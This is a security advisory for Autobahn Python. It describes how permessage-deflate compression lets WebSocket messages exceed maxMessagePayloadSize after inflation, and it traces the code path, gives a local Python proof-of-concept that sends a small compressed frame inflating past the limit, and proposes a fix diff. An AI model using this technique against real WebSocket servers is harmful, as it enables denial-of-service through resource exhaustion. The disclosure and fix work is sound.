# Autobahn Python permessage-deflate bypasses maxMessagePayloadSize after inflation

- CWE: CWE-409, CWE-770
- Packages: pip:autobahn, pip:crossbar

---

### Summary
Autobahn Python enforces `maxMessagePayloadSize` against the compressed WebSocket frame length before permessage-deflate inflation, then delivers the inflated message to application callbacks without a second size check. A client frame that is only 22 compressed bytes can inflate to 4096 bytes and reach `onMessage` even when the application configured a 128-byte message limit, defeating the resource boundary the option is meant to provide.

### Details
The permessage-deflate path installs a `PerMessageDeflate` instance when the server accepts a client offer in `src/autobahn/websocket/protocol.py:3371`. The common `PerMessageDeflateOfferAccept(offer)` path leaves `max_message_size` at its default `None` in `src/autobahn/websocket/compress_deflate.py:295`, and that value is copied into the compressor object in `src/autobahn/websocket/compress_deflate.py:723`. When a data frame arrives with RSV1 set, Autobahn marks the message compressed in `src/autobahn/websocket/protocol.py:1812`, calls `onMessageFrameBegin` with the compressed frame length, and increments `message_data_total_length` by that pre-inflate length in `src/autobahn/websocket/protocol.py:634`; the configured message cap is enforced against the same compressed accounting at `src/autobahn/websocket/protocol.py:636`. Only after those checks does Autobahn inflate the payload in `src/autobahn/websocket/protocol.py:1861`; because `max_message_size` is `None`, `src/autobahn/websocket/compress_deflate.py:812` calls zlib without an output cap. The inflated bytes are then passed to `onMessageFrameData` in `src/autobahn/websocket/protocol.py:1882`, appended for WebSocket version 13 without adding their inflated length to the message counter at `src/autobahn/websocket/protocol.py:667`, joined in `src/autobahn/websocket/protocol.py:690`, and delivered through `_onMessage` in `src/autobahn/websocket/protocol.py:693`. This is the same structural boundary mistake as [CVE redacted]: a compressed-size check is treated as if it bounded the decompressed application message.

### Reproduction
```py
import sys
import types
import zlib

if len(sys.argv) != 2:
    raise SystemExit("usage: autobahn_deflate_limit_poc.py <autobahn-python-source-dir>")

SRC = sys.argv[1]

class _Log:
    def debug(self, *args, **kwargs):
        pass

    def warn(self, *args, **kwargs):
        pass

    def error(self, *args, **kwargs):
        pass

class _Timer:
    def call_later(self, *args, **kwargs):
        return self

    def cancel(self):
        pass

txaio = types.ModuleType("txaio")
txaio.make_logger = lambda: _Log()
txaio.create_future = lambda result=None: result
txaio.resolve = lambda future, value=None: None
txaio.reject = lambda future, error=None: None
txaio.add_callbacks = (
    lambda future, callback=None, errback=None: callback(future) if callback else None
)
txaio.as_future = lambda fn, *args, **kwargs: fn(*args, **kwargs)
txaio.failure_format_traceback = lambda err: str(err)
txaio.call_later = lambda *args, **kwargs: _Timer()
txaio.make_batched_timer = lambda *args, **kwargs: _Timer()
txaio.time_ns = lambda: 0
txaio.use_asyncio = lambda: None
txaio.use_twisted = lambda: None
sys.modules["txaio"] = txaio

hyperlink = types.ModuleType("hyperlink")

class _URL:
    @classmethod
    def from_text(cls, text):
        return cls(text)

    def __init__(self, text):
        self._text = text

    def to_uri(self):
        return self

    def normalize(self):
        return self

    def to_text(self):
        return self._text

hyperlink.URL = _URL
sys.modules["hyperlink"] = hyperlink

wamp_types = types.ModuleType("autobahn.wamp.types")

class TransportDetails:
    pass

wamp_types.TransportDetails = TransportDetails
sys.modules["autobahn.wamp.types"] = wamp_types

sys.path.insert(0, SRC + "/src")

from autobahn.websocket.compress_deflate import PerMessageDeflate
from autobahn.websocket.protocol import WebSocketProtocol

class _Factory:
    isServer = True
    requireMaskedClientFrames = True
    maskServerFrames = False
    utf8validateIncoming = True
    applyMask = True
    maxFramePayloadSize = 128
    maxMessagePayloadSize = 128
    autoFragmentSize = 0
    failByDrop = True
    echoCloseCodeReason = False
    openHandshakeTimeout = 5
    closeHandshakeTimeout = 1
    tcpNoDelay = True
    autoPingInterval = 0
    autoPingTimeout = 0
    autoPingSize = 12
    autoPingRestartOnAnyTraffic = True
    logOctets = False
    logFrames = False
    trackTimings = False
    versions = WebSocketProtocol.SUPPORTED_PROTOCOL_VERSIONS
    webStatus = False
    perMessageCompressionAccept = staticmethod(lambda offer: None)
    serveFlashSocketPolicy = False
    flashSocketPolicy = ""
    allowedOrigins = ["*"]
    allowedOriginsPatterns = []
    allowNullOrigin = True
    maxConnections = 0
    trustXForwardedFor = 0
    _batched_timer = _Timer()

class CapturingProtocol(WebSocketProtocol):
    CONFIG_ATTRS = WebSocketProtocol.CONFIG_ATTRS_COMMON + WebSocketProtocol.CONFIG_ATTRS_SERVER

    def __init__(self):
        super().__init__()
        self.delivered = None

    def _onMessageBegin(self, isBinary):
        self.onMessageBegin(isBinary)

    def _onMessageFrameBegin(self, length):
        self.onMessageFrameBegin(length)

    def _onMessageFrameData(self, payload):
        self.onMessageFrameData(payload)

    def _onMessageFrameEnd(self):
        self.onMessageFrameEnd()

    def _onMessageFrame(self, payload):
        self.onMessageFrame(payload)

    def _onMessageEnd(self):
        self.onMessageEnd()

    def _onMessage(self, payload, isBinary):
        self.delivered = payload

    def sendData(self, data, sync=False, chopsize=None):
        pass

    def dropConnection(self, abort=True):
        self.droppedByMe = True
        self.state = WebSocketProtocol.STATE_CLOSED

def masked_compressed_text_frame(payload):
    compressor = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)
    compressed = compressor.compress(payload) + compressor.flush(zlib.Z_SYNC_FLUSH)
    compressed = compressed[:-4]
    mask = b"\x11\x22\x33\x44"
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(compressed))
    if len(compressed) <= 125:
        header = bytes([0xC1, 0x80 | len(compressed)])
    elif len(compressed) <= 65535:
        header = bytes([0xC1, 0x80 | 126]) + len(compressed).to_bytes(2, "big")
    else:
        raise RuntimeError("compressed fixture too large")
    return header + mask + masked, len(compressed)

limit = 128
inflated = b"X" * 4096
frame, compressed_len = masked_compressed_text_frame(inflated)
if compressed_len >= limit:
    raise SystemExit("compressed fixture does not pass pre-inflate limit")

proto = CapturingProtocol()
proto.factory = _Factory()
proto.log = _Log()
proto._connectionMade()
proto._perMessageCompress = PerMessageDeflate(
    is_server=True,
    server_no_context_takeover=False,
    client_no_context_takeover=False,
    server_max_window_bits=15,
    client_max_window_bits=15,
    mem_level=8,
    max_message_size=None,
)
proto.state = WebSocketProtocol.STATE_OPEN
proto.inside_message = False
proto.current_frame = None
proto.websocket_version = 13

proto._dataReceived(frame)

delivered_len = len(proto.delivered or b"")
if delivered_len > limit and not proto.wasMaxMessagePayloadSizeExceeded:
    print(
        "AUTOBAHN_DEFLATE_LIMIT_BYPASS "
        f"delivered_length={delivered_len} configured_limit={limit} "
        f"compressed_length={compressed_len}"
    )
    raise SystemExit(0)

print(
    "guarded "
    f"delivered_length={delivered_len} configured_limit={limit} "
    f"compressed_length={compressed_len} "
    f"max_exceeded={proto.wasMaxMessagePayloadSizeExceeded}"
)
raise SystemExit(1)

```

### Impact
A remote unauthenticated WebSocket client can exercise this when the target endpoint accepts permessage-deflate offers and relies on `maxMessagePayloadSize` as its per-message resource limit. The attack sends a valid masked compressed text or data frame with RSV1 set and a compressed length below the configured frame/message caps; those pre-inflate checks pass, and the default accept-object path also bypasses the optional inflater-level `max_message_size` cap because it remains `None`. The user-visible effect is that application handlers may allocate, validate, join, and process inflated messages larger than the configured limit, enabling resource-exhaustion pressure on affected permessage-deflate endpoints. The local artifact demonstrates availability impact only, not confidentiality or integrity compromise.

### Suggested fix
```001-fix.diff
diff --git a/src/autobahn/websocket/protocol.py b/src/autobahn/websocket/protocol.py
index 3c060804..4514e3cb 100644
--- a/src/autobahn/websocket/protocol.py
+++ b/src/autobahn/websocket/protocol.py
@@ -1869,6 +1869,17 @@ class WebSocketProtocol:
             if self.state == WebSocketProtocol.STATE_OPEN:
                 self.trafficStats.incomingOctetsWebSocketLevel += compressedLen
                 self.trafficStats.incomingOctetsAppLevel += uncompressedLen
+
+            if self._isMessageCompressed:
+                self.message_data_total_length += uncompressedLen - compressedLen
+                if 0 < self.maxMessagePayloadSize < self.message_data_total_length:
+                    self.wasMaxMessagePayloadSizeExceeded = True
+                    self._max_message_size_exceeded(
+                        self.message_data_total_length,
+                        self.maxMessagePayloadSize,
+                        f"received WebSocket message size {self.message_data_total_length} exceeds payload limit of {self.maxMessagePayloadSize} octets",
+                    )
+                    return False
 
             # incrementally validate UTF-8 payload
             #
```

*Reported by Team Atlanta.*
